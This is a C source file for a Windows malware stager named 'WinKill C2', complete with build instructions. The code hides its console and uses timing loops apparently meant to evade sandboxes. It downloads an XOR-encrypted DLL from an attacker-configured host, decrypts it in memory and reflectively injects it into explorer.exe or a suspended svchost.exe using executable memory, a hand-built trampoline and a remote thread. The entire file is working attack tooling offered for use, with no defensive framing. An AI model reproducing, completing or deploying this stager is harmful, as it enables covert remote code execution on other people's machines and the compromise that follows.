/*
 * WinKill C2 - Fileless HTTP Stager v4 (TRUE fileless)
 * =====================================================
 * Downloads XOR-encrypted agent.dll via HTTP, decrypts in memory,
 * manually maps the PE into a trusted process (reflective injection).
 * ZERO disk writes - no temp file, no LoadLibraryA.
 * Resumes the target process after injection (no hang).
 *
 * Usage: stager.exe   (URL baked in at compile time)
 *
 * Compile (see build.bat):
 *   echo #define DEFAULT_URL_HOST "IP" > _stager_cfg.h
 *   echo #define DEFAULT_URL_PORT "PORT" >> _stager_cfg.h
 *   gcc -O2 -s -m64 -fno-ident -o stager.exe stager.c -lwinhttp
 */

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

#include "_stager_cfg.h"

/* Default injection target (override via _stager_cfg.h) */
#ifndef DEFAULT_TARGET
#define DEFAULT_TARGET "explorer.exe"
#endif

static const BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

static void Hammer(void) {
    WCHAR b[256]; DWORD l = 256; volatile int d = 0;
    for (int i = 0; i < 50; i++) {
        GetSystemDirectoryW(b, l); GetWindowsDirectoryW(b, l);
        GetTempPathW(l, b); GetTickCount(); d += (int)b[0];
    }
}

/* ---------- HTTP download ---------- */
static BYTE *HttpDownload(LPCWSTR url, DWORD *outSize) {
    *outSize = 0;
    URL_COMPONENTS uc; ZeroMemory(&uc, sizeof(uc)); uc.dwStructSize = sizeof(uc);
    uc.dwHostNameLength = (DWORD)-1; uc.dwUrlPathLength = (DWORD)-1;
    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return NULL;

    WCHAR host[256] = {0}; wcsncpy(host, uc.lpszHostName, uc.dwHostNameLength);
    DWORD port = uc.nPort ? uc.nPort : 80;

    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return NULL;
    HINTERNET hC = WinHttpConnect(hS, host, port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return NULL; }

    WCHAR path[1024] = {0}; wcsncpy(path, uc.lpszUrlPath, uc.dwUrlPathLength);
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        (port == 443) ? WINHTTP_FLAG_SECURE : 0);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return NULL; }

    if (!WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hR, NULL)) {
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        return NULL;
    }

    BYTE *buf = NULL; DWORD total = 0, cap = 0;
    while (1) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hR, &avail) || !avail) break;
        if (total + avail > cap) {
            cap = total + avail + 65536;
            BYTE *nb = (BYTE *)HeapAlloc(GetProcessHeap(), 0, cap);
            if (!nb) break;
            if (buf) { memcpy(nb, buf, total); HeapFree(GetProcessHeap(), 0, buf); }
            buf = nb;
        }
        DWORD rd = 0;
        WinHttpReadData(hR, buf + total, avail, &rd);
        total += rd;
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    *outSize = total;
    return buf;
}

/* ---------- Find process ---------- */
static DWORD FindProc(const char *name) {
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); DWORD pid = 0;
    if (Process32First(sn, &pe)) {
        do { if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn); return pid;
}

static void XorDecrypt(BYTE *d, DWORD n) {
    for (DWORD i = 0; i < n; i++) d[i] ^= g_key[i % 16];
}

/* ---------- Get module base in target process ---------- */
static ULONG_PTR GetRemoteModuleBase(DWORD pid, const char *modName) {
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (sn == INVALID_HANDLE_VALUE) return 0;
    MODULEENTRY32 me; me.dwSize = sizeof(me);
    ULONG_PTR base = 0;
    if (Module32First(sn, &me)) {
        do {
            if (_stricmp(me.szModule, modName) == 0) {
                base = (ULONG_PTR)me.modBaseAddr;
                break;
            }
        } while (Module32Next(sn, &me));
    }
    CloseHandle(sn);
    return base;
}

/* ============================================================
 * Manual PE mapping (reflective injection, zero disk)
 * ============================================================ */
static BOOL ManualMapDLL(HANDLE hTarget, DWORD pid, BYTE *dllData,
                         LPVOID *outBase, LPVOID *outEntry) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    ULONG_PTR imageBase = nt->OptionalHeader.ImageBase;

    // Allocate in target
    LPVOID remoteBase = VirtualAllocEx(hTarget, (LPVOID)imageBase, imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase)
        remoteBase = VirtualAllocEx(hTarget, NULL, imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) return FALSE;

    // Build image locally
    BYTE *local = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize);
    if (!local) { VirtualFreeEx(hTarget, remoteBase, 0, MEM_RELEASE); return FALSE; }

    // Copy headers + sections
    DWORD hdrSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(local, dllData, hdrSize);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData > 0) {
            DWORD sz = sec->SizeOfRawData;
            if (sz > sec->Misc.VirtualSize) sz = sec->Misc.VirtualSize;
            memcpy(local + sec->VirtualAddress, dllData + sec->PointerToRawData, sz);
        }
    }

    // Apply relocations
    LONG_PTR delta = (LONG_PTR)remoteBase - (LONG_PTR)imageBase;
    if (delta != 0) {
        DWORD relRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relSiz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (relRVA && relSiz) {
            PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(local + relRVA);
            DWORD end = relRVA + relSiz;
            while ((DWORD)((BYTE*)rel - local) < end && rel->VirtualAddress) {
                DWORD cnt = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *ents = (WORD*)((BYTE*)rel + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < cnt; i++)
                    if (ents[i] >> 12 == IMAGE_REL_BASED_DIR64)
                        *(ULONG_PTR*)(local + rel->VirtualAddress + (ents[i] & 0xFFF)) += delta;
                rel = (PIMAGE_BASE_RELOCATION)((BYTE*)rel + rel->SizeOfBlock);
            }
        }
    }

    // Resolve imports using target process module bases
    DWORD impRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (impRVA) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(local + impRVA);
        while (imp->Name) {
            char *modName = (char*)(local + imp->Name);
            HMODULE ourMod = GetModuleHandleA(modName);
            if (!ourMod) ourMod = LoadLibraryA(modName);
            ULONG_PTR targetMod = GetRemoteModuleBase(pid, modName);
            if (!targetMod) targetMod = (ULONG_PTR)ourMod;  // fallback (kernel32 etc)

            ULONG_PTR *thunk = (ULONG_PTR*)(local + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            ULONG_PTR *iat   = (ULONG_PTR*)(local + imp->FirstThunk);

            for (DWORD i = 0; thunk[i]; i++) {
                ULONG_PTR ourAddr;
                if (thunk[i] & IMAGE_ORDINAL_FLAG64)
                    ourAddr = (ULONG_PTR)GetProcAddress(ourMod, (LPCSTR)(thunk[i] & 0xFFFF));
                else {
                    PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(local + thunk[i]);
                    ourAddr = (ULONG_PTR)GetProcAddress(ourMod, (char*)ibn->Name);
                }
                if (ourAddr)
                    iat[i] = ourAddr - (ULONG_PTR)ourMod + targetMod;
            }
            imp++;
        }
    }

    // Write mapped image to target
    SIZE_T wr;
    if (!WriteProcessMemory(hTarget, remoteBase, local, imageSize, &wr)) {
        HeapFree(GetProcessHeap(), 0, local);
        VirtualFreeEx(hTarget, remoteBase, 0, MEM_RELEASE);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, local);

    *outBase = remoteBase;
    *outEntry = (LPVOID)((BYTE*)remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
    return TRUE;
}

/* ---------- Write trampoline: call DllMain(DLL_PROCESS_ATTACH) ---------- */
static LPVOID WriteTrampoline(HANDLE hTarget, LPVOID entry) {
    BYTE tramp[32] = {0};
    int pos = 0;
    // mov rdx, 1  (DLL_PROCESS_ATTACH)
    tramp[pos++] = 0x48; tramp[pos++] = 0xC7; tramp[pos++] = 0xC2;
    tramp[pos++] = 0x01; tramp[pos++] = 0x00; tramp[pos++] = 0x00; tramp[pos++] = 0x00;
    // xor r8, r8   (NULL)
    tramp[pos++] = 0x4D; tramp[pos++] = 0x31; tramp[pos++] = 0xC0;
    // mov rax, imm64
    tramp[pos++] = 0x48; tramp[pos++] = 0xB8;
    *(ULONG_PTR*)(tramp + pos) = (ULONG_PTR)entry; pos += 8;
    // jmp rax
    tramp[pos++] = 0xFF; tramp[pos++] = 0xE0;

    LPVOID trampAddr = VirtualAllocEx(hTarget, NULL, 64,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!trampAddr) return NULL;
    SIZE_T wr;
    WriteProcessMemory(hTarget, trampAddr, tramp, pos, &wr);
    return trampAddr;
}

/* ============================================================ */
int main(void) {
    // Hide console window immediately (silent, no cmd flash)
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    WCHAR g_url[512];
    wsprintfW(g_url, L"http://%S:%S/payload.bin", DEFAULT_URL_HOST, DEFAULT_URL_PORT);

    Hammer();
    Sleep(1200 + (GetTickCount() & 0xFFF));
    Hammer();

    /* 1. Download encrypted DLL (memory only) */
    DWORD dlSize = 0;
    BYTE *dll = HttpDownload(g_url, &dlSize);
    if (!dll || dlSize < 1024) return 1;

    /* 2. Decrypt in memory */
    XorDecrypt(dll, dlSize);
    if (dll[0] != 'M' || dll[1] != 'Z') {
        SecureZeroMemory(dll, dlSize); HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    /* 3. Find target or spawn suspended svchost */
    DWORD pid = FindProc(DEFAULT_TARGET);
    HANDLE hTarget = NULL;
    HANDLE hMainThread = NULL;

    if (pid) {
        hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    } else {
        char sysDir[MAX_PATH], svcPath[MAX_PATH];
        GetSystemDirectoryA(sysDir, MAX_PATH);
        wsprintfA(svcPath, "%s\\svchost.exe", sysDir);
        STARTUPINFOA si; PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        if (CreateProcessA(NULL, svcPath, NULL, NULL, FALSE,
                          CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            pid = pi.dwProcessId;
            hTarget = pi.hProcess;
            hMainThread = pi.hThread;  // keep for resume
        }
    }
    if (!hTarget) {
        SecureZeroMemory(dll, dlSize); HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    /* 4. Manual map DLL (reflective, zero disk) */
    LPVOID base = NULL, entry = NULL;
    if (!ManualMapDLL(hTarget, pid, dll, &base, &entry)) {
        if (hMainThread) { CloseHandle(hMainThread); TerminateProcess(hTarget, 0); }
        CloseHandle(hTarget);
        SecureZeroMemory(dll, dlSize); HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    /* 5. Trampoline -> DllMain(DLL_PROCESS_ATTACH) */
    LPVOID tramp = WriteTrampoline(hTarget, entry);
    if (!tramp) {
        if (hMainThread) { CloseHandle(hMainThread); TerminateProcess(hTarget, 0); }
        CloseHandle(hTarget);
        SecureZeroMemory(dll, dlSize); HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    HANDLE hRemote = CreateRemoteThread(hTarget, NULL, 0,
        (LPTHREAD_START_ROUTINE)tramp, base, 0, NULL);
    if (!hRemote) {
        if (hMainThread) { CloseHandle(hMainThread); TerminateProcess(hTarget, 0); }
        CloseHandle(hTarget);
        SecureZeroMemory(dll, dlSize); HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    /* 6. Resume suspended target's main thread (fix hang) */
    if (hMainThread) {
        ResumeThread(hMainThread);
        CloseHandle(hMainThread);
    }

    /* 7. Cleanup */
    WaitForSingleObject(hRemote, 3000);
    CloseHandle(hRemote);
    CloseHandle(hTarget);
    SecureZeroMemory(dll, dlSize);
    HeapFree(GetProcessHeap(), 0, dll);
    return 0;
}
